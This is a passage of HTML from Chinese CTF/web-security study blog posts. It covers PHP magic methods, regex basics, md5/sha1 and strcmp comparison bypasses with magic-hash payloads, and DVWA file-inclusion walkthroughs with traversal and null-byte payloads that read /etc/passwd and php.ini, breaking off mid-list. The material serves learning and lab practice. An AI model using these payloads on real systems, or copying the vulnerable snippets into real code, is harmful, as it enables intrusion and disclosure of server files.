+<p>如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">  public $sex;</span><br><span class="line">  public $name;</span><br><span class="line">  public $age;</span><br><span class="line"> </span><br><span class="line">  public function __construct($name=&quot;&quot;, $age=25, $sex=&apos;男&apos;)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;name = $name;</span><br><span class="line">    $this-&gt;age = $age;</span><br><span class="line">    $this-&gt;sex = $sex;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$person = new Person(&apos;小明&apos;); // 初始赋值</span><br><span class="line">echo $person;</span><br></pre></td></tr></table></figure></p>
+<p>结果为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Recoverable fatal error: Object of class Person could not be converted to string in D:\appserv\www\ch01\1.php on line 18</span><br></pre></td></tr></table></figure></p>
+<p>很明显，页面报了一个致命错误，这是语法所不允许的。</p>
+<h2 id="sleep-，执行serialize-时，先会调用这个函数"><a href="#sleep-，执行serialize-时，先会调用这个函数" class="headerlink" title="__sleep()，执行serialize()时，先会调用这个函数"></a>__sleep()，执行serialize()时，先会调用这个函数</h2><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p>
+<p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
+<p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
+<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用</p>
+<h3 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">  public $sex;</span><br><span class="line">  public $name;</span><br><span class="line">  public $age;</span><br><span class="line"> </span><br><span class="line">  public function __construct($name=&quot;&quot;, $age=25, $sex=&apos;男&apos;)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;name = $name;</span><br><span class="line">    $this-&gt;age = $age;</span><br><span class="line">    $this-&gt;sex = $sex;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  /**</span><br><span class="line">   * @return array</span><br><span class="line">   */</span><br><span class="line">  public function __sleep() &#123;</span><br><span class="line">    echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;;</span><br><span class="line">    $this-&gt;name = base64_encode($this-&gt;name);</span><br><span class="line">    return array(&apos;name&apos;, &apos;age&apos;); // 这里必须返回一个数值，里边的元素表示返回的属性名称</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$person = new Person(&apos;小明&apos;); // 初始赋值</span><br><span class="line">echo serialize($person);</span><br><span class="line">echo &apos;&lt;br/&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<p>结果为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="wakeup-，执行unserialize-时，先会调用这个函数"><a href="#wakeup-，执行unserialize-时，先会调用这个函数" class="headerlink" title="__wakeup()，执行unserialize()时，先会调用这个函数"></a>__wakeup()，执行unserialize()时，先会调用这个函数</h2><p>如果说 <strong>sleep() 是白的，那么 </strong>wakeup() 就是黑的了。</p>
+<p>那么为什么呢？</p>
+<p>因为：</p>
+<p>与之相反，<code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
+<h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><p>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p>
+<h3 id="代码示例-4"><a href="#代码示例-4" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">  public $sex;</span><br><span class="line">  public $name;</span><br><span class="line">  public $age;</span><br><span class="line"> </span><br><span class="line">  public function __construct($name=&quot;&quot;, $age=25, $sex=&apos;男&apos;)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;name = $name;</span><br><span class="line">    $this-&gt;age = $age;</span><br><span class="line">    $this-&gt;sex = $sex;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  /**</span><br><span class="line">   * @return array</span><br><span class="line">   */</span><br><span class="line">  public function __sleep() &#123;</span><br><span class="line">    echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;;</span><br><span class="line">    $this-&gt;name = base64_encode($this-&gt;name);</span><br><span class="line">    return array(&apos;name&apos;, &apos;age&apos;); // 这里必须返回一个数值，里边的元素表示返回的属性名称</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  /**</span><br><span class="line">   * __wakeup</span><br><span class="line">   */</span><br><span class="line">  public function __wakeup() &#123;</span><br><span class="line">    echo &quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;;</span><br><span class="line">    $this-&gt;name = 2;</span><br><span class="line">    $this-&gt;sex = &apos;男&apos;;</span><br><span class="line">    // 这里不需要返回数组</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$person = new Person(&apos;小明&apos;); // 初始赋值</span><br><span class="line">var_dump(serialize($person));</span><br><span class="line">var_dump(unserialize(serialize($person)));</span><br></pre></td></tr></table></figure>
+<p>输出结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">string(58) &quot;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;&quot; 当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line"> 当在类外部使用unserialize()时会调用这里的__wakeup()方法</span><br><span class="line">object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) &#125;</span><br></pre></td></tr></table></figure></p>
+<p>还有很多，这里先讲这几个常用方法，以后补上，这里给出链接<br><br><a href="http://www.jb51.net/article/96167.htm" target="_blank" rel="noopener">http://www.jb51.net/article/96167.htm</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP正则表达式" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/PHP正则表达式/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.586Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/PHP正则表达式/">PHP正则表达式</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>CTF中经常出现与正则表达式相关的题目,但一直总是看PHP正则表达式表,这里对正则表达式做个探究详解.</p>
+<h2 id="0x02-概述"><a href="#0x02-概述" class="headerlink" title="0x02 概述"></a>0x02 概述</h2><p>正则表达式是一种描述字符串结果的语法规则，是一个特定的格式化模式，可以匹配、替换、截取匹配的字符串。常用的语言基本上都有正则表达式，如JavaScript、java等。其实，只有了解一种语言的正则使用，其他语言的正则使用起来，就相对简单些。文本主要围绕解决下面问题展开。</p>
+<ul>
+<li>什么是限定符与定位符</li>
+<li>什么是单词定位符</li>
+<li>特殊字符有哪些</li>
+<li>什么是逆向引用以及怎样使用逆向引用</li>
+<li>匹配模式</li>
+<li>php中怎样使用正则表达式</li>
+<li>php中哪些方面需要用到正则</li>
+<li>怎样进行邮箱匹配，url匹配，手机匹配</li>
+<li>怎样使用正则替换字符串中某些字符</li>
+<li>贪婪匹配与惰性匹配区别</li>
+<li>正则表达式之回溯与固态分组</li>
+<li>正则优缺点有哪些<h2 id="正则表达式的基本知识总结"><a href="#正则表达式的基本知识总结" class="headerlink" title="正则表达式的基本知识总结"></a>正则表达式的基本知识总结</h2><h3 id="行定位符（-与-）"><a href="#行定位符（-与-）" class="headerlink" title="行定位符（^与$）"></a>行定位符（^与$）</h3>行定位符是用来描述字符串的边界。“$”表示行结尾,“^”表示行开始如”^de”，表示以de开头的字符串   “de$”,表示以de结尾的字符串。<h3 id="单词定界符"><a href="#单词定界符" class="headerlink" title="单词定界符"></a>单词定界符</h3>我们在查找的一个单词的时候，如an是否在一个字符串”gril and body”中存在，很明显如果匹配的话，an肯定是可以匹配字符串“gril and body”匹配到，怎样才能让其匹配单词，而不是单词的一部分呢？这时候，我们可以是哟个单词定界符\b。<br>\ban\b 去匹配”gril and body”的话，就会提示匹配不到。<br>当然还有一个大写的\B，它的意思，和\b正好相反，它匹配的字符串不能使一个完整的单词，而是其他单词或字符串中的一部分。如\Ban\B<h3 id="选择字符-表示或"><a href="#选择字符-表示或" class="headerlink" title="选择字符(|),表示或"></a>选择字符(|),表示或</h3>选择字符表示或的意思。如Aa|aA，表示Aa或者是aA的意思。注意使用”[]”与”|”的区别，在于”[]”只能匹配单个字符，而”|”可以匹配任意长度的字符串。在使用”[]”的时候，往往配合连接字符”-“一起使用，如[a-d],代表a或b或c或d。<h3 id="排除字符"><a href="#排除字符" class="headerlink" title="排除字符"></a>排除字符</h3>正则表达式提供了”^”来表示排除不符合的字符，^一般放在[]中。如[^1-5]，该字符不是1~5之间的数字。<h3 id="限定符-n-m"><a href="#限定符-n-m" class="headerlink" title="限定符(?*+{n,m})"></a>限定符(?*+{n,m})</h3>限定符主要是用来限定每个字符串出现的次数。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">限定字符     含义</span><br><span class="line">   ?      零次或一次</span><br><span class="line">   *      零次或多次</span><br><span class="line">   +      一次或多次</span><br><span class="line">  &#123;n&#125;       n次</span><br><span class="line">  &#123;n,&#125;     至少n次</span><br><span class="line">  &#123;n,m&#125;    n到m次</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>如(A+)表示一个或多个A</p>
+<h3 id="点号操作符"><a href="#点号操作符" class="headerlink" title="点号操作符 ."></a>点号操作符 .</h3><p>匹配任意一个字符（不包含换行符）</p>
+<h3 id="表达式中的反斜杠"><a href="#表达式中的反斜杠" class="headerlink" title="表达式中的反斜杠 \"></a>表达式中的反斜杠 \</h3><p>表达式中的反斜杠有多重意义，如转义、指定预定义的字符集、定义断言、显示不打印的字符。</p>
+<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>转义字符主要是将一些特殊字符转为普通字符。而这些常用特殊字符有”.”，”?”、”\”等。</p>
+<h3 id="指定预定义的字符集"><a href="#指定预定义的字符集" class="headerlink" title="指定预定义的字符集"></a>指定预定义的字符集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符          含义</span><br><span class="line">\d         任意一个十进制数字[0-9]</span><br><span class="line">\D	       任意一个非十进制数字</span><br><span class="line">\s         任意一个空白字符(空格、换行符、换页符、回车符、字表符)</span><br><span class="line">\S         任意一个非空白字符</span><br><span class="line">\w         任意一个单词字符</span><br><span class="line">\W	       任意个非单词字符</span><br></pre></td></tr></table></figure>
+<h3 id="显示不可打印的字符"><a href="#显示不可打印的字符" class="headerlink" title="显示不可打印的字符"></a>显示不可打印的字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符          含义</span><br><span class="line">\a          报警</span><br><span class="line">\b          退格</span><br><span class="line">\f          换页</span><br><span class="line">\n          换行</span><br><span class="line">\r          回车</span><br><span class="line">\t          字表符</span><br></pre></td></tr></table></figure>
+<h3 id="括号字符"><a href="#括号字符" class="headerlink" title="括号字符()"></a>括号字符()</h3><p>在正则表达式中小括号的作用主要有:</p>
+<ul>
+<li>改变限定符如（|、* 、^)的作用范围<br>如(my|your)baby，如果没有”()”，|将匹配的是要么是my，要么是yourbaby,有了小括号，匹配的就是mybaby或yourbaby。</li>
+<li>进行分组，便于反向引用<h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3>反向引用，就是依靠子表达式的”记忆”功能，匹配连续出现的字串或是字符。如(dqs)(pps)\1\2，表示匹配字符串dqsppsdqspps。</li>
+</ul>
+<h3 id="模式修饰符"><a href="#模式修饰符" class="headerlink" title="模式修饰符"></a>模式修饰符</h3><p>式修饰符的作用是设定模式，也就是正则表达式如何解释。php中主要模式如下表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修饰符	说明</span><br><span class="line">i	忽略大小写</span><br><span class="line">m	多文本模式</span><br><span class="line">s	单行文本模式</span><br><span class="line">x	忽略空白字符</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://www.cnblogs.com/hellohell/p/5718319.html" target="_blank" rel="noopener">https://www.cnblogs.com/hellohell/p/5718319.html</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP漏洞总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/PHP漏洞总结/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.586Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/PHP漏洞总结/">PHP函数漏洞总结</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="PHP函数漏洞总结"><a href="#PHP函数漏洞总结" class="headerlink" title="PHP函数漏洞总结"></a>PHP函数漏洞总结</h1><p>参考链接:<br><br><a href="https://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">PHP函数漏洞总结</a></p>
+<h2 id="0x01-php-md5-函数漏洞"><a href="#0x01-php-md5-函数漏洞" class="headerlink" title="0x01 php md5()函数漏洞"></a>0x01 php md5()函数漏洞</h2><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;]) &#123;</span><br><span class="line">        if (@md5($_GET[&apos;a&apos;]) === @md5($_GET[&apos;b&apos;])) &#123;</span><br><span class="line">            echo (&apos;right&apos;);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            echo (&apos;Wrong&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里假设URL为<a href="http://haha.com" target="_blank" rel="noopener">http://haha.com</a></p>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>常见的payload有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x01 md5(str)</span><br><span class="line">    QNKCDZO</span><br><span class="line">    240610708</span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line">     sha1(str)</span><br><span class="line">    sha1(&apos;aaroZmOk&apos;)  </span><br><span class="line">    sha1(&apos;aaK1STfY&apos;)</span><br><span class="line">    sha1(&apos;aaO8zKZF&apos;)</span><br><span class="line">    sha1(&apos;aa3OFF9m&apos;)</span><br><span class="line"></span><br><span class="line">0x02 md5(md5(str).&quot;SALT&quot;)</span><br><span class="line">    2</span><br></pre></td></tr></table></figure></p>
+<p>还有另外一种方法:MD5不能处理数组，若有以下判断则可用数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;yes&quot;;</span><br><span class="line">&#125;</span><br><span class="line">//http://127.0.0.1/1.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></p>
+<p>这是因为:URL可以传递数组参数，形式是<a href="http://haha.com?x[]=1&amp;x[]=2&amp;x[]=3，这样就提交了一个x[]={1,2,3}的数组。" target="_blank" rel="noopener">http://haha.com?x[]=1&amp;x[]=2&amp;x[]=3，这样就提交了一个x[]={1,2,3}的数组。</a><br>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null,这样就得到答案了。</p>
+<h2 id="0x02-php-strcmp-函数漏洞"><a href="#0x02-php-strcmp-函数漏洞" class="headerlink" title="0x02 php strcmp()函数漏洞"></a>0x02 php strcmp()函数漏洞</h2><p>比较两个字符串（区分大小写）</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp(str1,str2)</span><br></pre></td></tr></table></figure>
+<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 </span><br><span class="line">5.2 中是将两个参数先转换成string类型。 </span><br><span class="line">5.3.3以后，当比较数组和字符串的时候，返回是0。 </span><br><span class="line">5.5 中如果参数不是string类型，直接return了</span><br></pre></td></tr></table></figure>
+<h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    if (strcmp(&apos;xd&apos;,$password)) &#123;</span><br><span class="line">     echo &apos;NO!&apos;;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        echo &apos;YES!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-php-sha1-和-md5-函数"><a href="#0x03-php-sha1-和-md5-函数" class="headerlink" title="0x03 php sha1 和 md5 函数"></a>0x03 php sha1 和 md5 函数</h2><p>md5 和 sha1 无法处理数组，返回 NULL(NULL一般情况下也为0)</p>
+<h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (@sha1([]) ==  false)</span><br><span class="line">    echo 1;</span><br><span class="line">if (@md5([]) ==  false)</span><br><span class="line">    echo 2;</span><br><span class="line">echo var_dump(@sha1([]));</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/PHP文件包含漏洞/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.570Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/PHP文件包含漏洞/">文件包含漏洞</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>参考:《白帽子讲web安全》<br><br>实战平台:DVWA平台(DVWA平台安装具体自己百度)</p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞是”代码注入”的一种。”代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。”代码注入”的典型代表就是文件包含(File Inclusion)。文件包含可能会出现在JSP,PHP,ASP等语言中。<br><br>在PHP中主要有四个函数:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</span><br><span class="line"></span><br><span class="line">require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</span><br><span class="line"></span><br><span class="line">include_once()和require_once()：若文件中代码已被包含则不会再次包含</span><br></pre></td></tr></table></figure></p>
+<h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion,简称LFI)</span><br></pre></td></tr></table></figure>
+<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>首先打开DVWA登陆,选择File Inclusion进行文件包含漏洞测试，记得在DVWA Security上选择等级low<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/DGYZK%60Y1%252H%5BW_UQ%60M0R87H.png" alt="image"></p>
+<ul>
+<li>随意构造?page=2333333,发现错误报告（开了错误提示为前提)<br><img src="http://p1vrkwaxt.bkt.clouddn.com/R3IQE%6090WIU$%7DWI4Y4JA6W0.png" alt="image"><br>虽然Windows不能直接获取文件，但是给出的错误信息中爆出了绝对路径D:\appserv\www\DVWA-master\<br><br>构造url(绝对路径)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=D:\appserv\www\DVWA-master\php.ini</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>得到php.ini的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc = Off allow_url_fopen = On allow_url_include = On</span><br></pre></td></tr></table></figure></p>
+<p>构造url(相对路径)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=../../../../../../../../appser/www/DVWA-master/php.ini</span><br></pre></td></tr></table></figure></p>
+<p>这里加多次../是为了可以保证回到根目录</p>
+<h3 id="有限制的本地文件包含"><a href="#有限制的本地文件包含" class="headerlink" title="有限制的本地文件包含"></a>有限制的本地文件包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;inc/&quot;</span><br><span class="line"></span><br><span class="line">. $_GET[&apos;file&apos;]</span><br><span class="line"> . &quot;.htm&quot;);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>%00截断：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
+<ul>
+<li>%00截断目录遍历：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/www/%00</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
+<ul>
+<li>路径长度截断：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<ul>
